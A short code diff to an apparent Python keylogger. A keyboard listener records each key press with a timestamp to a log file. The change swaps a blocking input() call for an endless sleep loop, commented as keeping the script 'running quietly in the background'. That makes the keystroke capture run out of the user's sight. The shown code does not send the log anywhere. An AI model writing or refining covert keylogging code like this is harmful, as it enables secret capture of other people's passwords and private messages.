@@ -14,9 +14,11 @@ def keyPressed(key):    #Handles key press events, logs the key pressed along wi
              logKey.write(f"{datetime.now()} - [{str(key)}]\n")
  
 if __name__ == "__main__":
-     # Initialize the key listener
+     # Start listening for key presses
      listener = keyboard.Listener(on_press=keyPressed)
      listener.start()  # Start listening
-     input()  # Keep the script running
+     # Keep the script running quietly in the background
+     while True:
+         time.sleep(1)
  
  
